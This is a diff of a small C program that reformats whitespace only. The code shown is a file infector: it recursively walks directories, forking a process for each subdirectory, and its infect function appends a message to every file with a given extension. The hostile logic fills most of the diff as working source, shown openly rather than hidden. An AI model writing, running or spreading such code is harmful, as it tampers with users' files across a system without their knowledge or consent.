@@ -11,22 +11,22 @@
 
 int is_file(const char *file) {
 	// Indicate if the file is a standard file or a directory.
-	
-    struct stat file_stat;
-    stat(file, &file_stat);
-    return S_ISREG(file_stat.st_mode);
+
+	struct stat file_stat;
+	stat(file, &file_stat);
+	return S_ISREG(file_stat.st_mode);
 }
 
 void infect(const char *file) {
 	// Infect the targeted file.
-		
+	
 	FILE *pFile;
 	if ((pFile = fopen(file, "a+")) == NULL) {
 		return;
 	}
-	
+
 	fwrite(MSG, strlen(MSG), sizeof(char), pFile);
-	
+
 	fclose(pFile);
 }
 
@@ -41,26 +41,26 @@ void get_targets(const char *directory, const int need_cd) {
 	if (need_cd && chdir(directory) == -1) {
 		return;
 	}
-	
+
 	struct dirent *pDirent = NULL;	
-    while ((pDirent = readdir(pDir)) != NULL) {
-    
-        if (!is_file(pDirent->d_name)) {
-        	if (pDirent->d_name[0] != '.') {
-        		if (fork() == 0) {
-		        	get_targets(pDirent->d_name, 1);
-		        	break;
-		        }
-        	}
+	while ((pDirent = readdir(pDir)) != NULL) {
+
+		if (!is_file(pDirent->d_name)) {
+			if (pDirent->d_name[0] != '.') {
+				if (fork() == 0) {
+					get_targets(pDirent->d_name, 1);
+					break;
+				}
+			}
 			continue;
-        }
-        
-        if (strncmp(pDirent->d_name + (strlen(pDirent->d_name) - 2), EXT, strlen(EXT)) == 0) {
-        	infect(pDirent->d_name);
-        }
-    }
-    
-    closedir(pDir);
+		}
+
+		if (strncmp(pDirent->d_name + (strlen(pDirent->d_name) - 2), EXT, strlen(EXT)) == 0) {
+			infect(pDirent->d_name);
+		}
+	}
+
+	closedir(pDir);
 }
 
 int main(int argc, char **argv) {
@@ -72,6 +72,6 @@ int main(int argc, char **argv) {
 		get_targets(pCurrent_dir, 0);
 		free(pCurrent_dir);
 	}
-	
-    return EXIT_SUCCESS;
+
+	return EXIT_SUCCESS;
 }
